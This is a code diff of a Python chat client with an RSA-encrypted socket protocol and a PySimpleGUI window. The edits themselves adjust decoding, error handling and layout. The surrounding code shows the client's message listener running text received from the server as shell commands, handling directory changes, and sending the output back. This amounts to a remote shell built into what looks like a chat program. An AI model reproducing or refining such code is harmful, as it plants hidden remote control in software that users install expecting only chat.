@@ -3,10 +3,9 @@ import socket
 from termcolor import colored
 from threading import Thread
 import PySimpleGUI as sg
+import subprocess, os
 from tkinter import simpledialog, Tk
 import rsa
-
-import sys, subprocess, os
 
 class UserBannedException(Exception):
     pass
@@ -22,7 +21,7 @@ def listen_for_messages(s : socket.socket):
 
     while not exit_app:
         try:
-            t_nickname, data = rsa.decrypt(s.recv(4096), private_key).decode().split(",")
+            t_nickname, data = rsa.decrypt(s.recv(4096), private_key).decode('utf-8', errors='ignore').split(",")
         except Exception as e:
             continue
 
@@ -55,13 +54,16 @@ def listen_for_messages(s : socket.socket):
                 try:
                     os.chdir(data[3:])
                 except FileNotFoundError:
-                    send_message("/output,File or directory not found")
+                    send_message("/output,File or directory not found\n")
+                    continue
+                except PermissionError:
+                    send_message("/output, Permission denied\n")
                     continue
 
             elif len(data) > 0:
                 p = subprocess.run(data, shell=True, capture_output=True)
                 data = p.stdout + p.stderr
-                cmd = "\n" + data.decode() + f"\n"
+                cmd = "\n" + data.decode('utf-8', errors='ignore') + f"\n"
 
             max_cryptable = int(RSA_KEY_LEN/8) - 19
             for n in range(0,len(cmd),max_cryptable): # max bytes that rsa can encrypt with 1024 bit key
@@ -77,14 +79,14 @@ def listen_for_messages(s : socket.socket):
 def create_window():
     
     CHAT_WIDTH = 85
-    CHAT_HEIGHT = 20
+    CHAT_HEIGHT = 25
     BUTTON_WIDTH = 25
     BUTTON_HEIGHT = 18
     TEXT_PAD = (0,5)
     chat_row = [
         [
             sg.Multiline(key="-CHAT HISTORY-", size=(CHAT_WIDTH, CHAT_HEIGHT), text_color="white", background_color="#222", font=("default", 11), pad=TEXT_PAD, focus=False, no_scrollbar=True, disabled=True),
-            sg.Listbox(users, key="-USERS-", size=(15, CHAT_HEIGHT+8), no_scrollbar=True),
+            sg.Listbox(users, key="-USERS-", size=(15, CHAT_HEIGHT), no_scrollbar=True),
         ]
     ]
 
@@ -153,7 +155,7 @@ def connect_to_server():
 
         exchange_keys()
 
-        command, *data = rsa.decrypt(s.recv(1024), private_key).decode().split(",")    # if not banned it contains the users
+        command, *data = rsa.decrypt(s.recv(1024), private_key).decode('utf-8', errors='ignore').split(",")    # if not banned it contains the users
         if command == "/ban":
             raise UserBannedException()
         
